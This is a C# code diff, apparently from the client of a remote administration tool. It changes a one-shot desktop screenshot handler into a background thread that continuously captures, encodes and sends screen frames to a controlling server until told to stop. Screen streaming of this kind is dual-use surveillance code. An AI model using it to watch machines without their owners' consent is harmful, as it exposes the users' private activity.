@@ -14,46 +14,67 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
         {
-            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality ||
-                StreamCodec.Monitor != command.Monitor)
+            if (command.Action == RemoteDesktopAction.Stop)
+            {
+                IsStreamingDesktop = false;
+                return;
+            }
+
+            if (IsStreamingDesktop) return;
+
+            IsStreamingDesktop = true;
+
+            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor)
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);
 
-            BitmapData bmpdata = null;
-            try
+            new Thread(() =>
             {
-                LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
-                bmpdata = LastDesktopScreenshot.LockBits(
-                    new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
-                    LastDesktopScreenshot.PixelFormat);
-
-                using (MemoryStream stream = new MemoryStream())
+                while (IsStreamingDesktop)
                 {
-                    StreamCodec.CodeImage(bmpdata.Scan0,
-                        new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
-                        new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
-                        LastDesktopScreenshot.PixelFormat,
-                        stream);
-                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
-                        StreamCodec.Monitor).Execute(client);
-                }
-            }
-            catch
-            {
-                new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
-
-                StreamCodec = null;
-            }
-            finally
-            {
-                if (LastDesktopScreenshot != null)
-                {
-                    if (bmpdata != null)
+                    if (!Program.ConnectClient.Connected) // disconnected
                     {
-                        LastDesktopScreenshot.UnlockBits(bmpdata);
+                        IsStreamingDesktop = false;
+                        return;
                     }
-                    LastDesktopScreenshot.Dispose();
+                    BitmapData desktopData = null;
+                    Bitmap desktop = null;
+                    try
+                    {
+                        desktop = Helper.Helper.GetDesktop(command.Monitor);
+                        desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
+                            ImageLockMode.ReadWrite, desktop.PixelFormat);
+
+                        using (MemoryStream stream = new MemoryStream())
+                        {
+                            if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
+                            StreamCodec.CodeImage(desktopData.Scan0,
+                                new Rectangle(0, 0, desktop.Width, desktop.Height),
+                                new Size(desktop.Width, desktop.Height),
+                                desktop.PixelFormat, stream);
+                            new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
+                                StreamCodec.Monitor).Execute(client);
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        if (StreamCodec != null)
+                            new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
+
+                        StreamCodec = null;
+                    }
+                    finally
+                    {
+                        if (desktop != null)
+                        {
+                            if (desktopData != null)
+                            {
+                                desktop.UnlockBits(desktopData);
+                            }
+                            desktop.Dispose();
+                        }
+                    }
                 }
-            }
+            }).Start();
         }
 
         public static void HandleDoMouseClick(Packets.ServerPackets.DoMouseClick command, Client client)
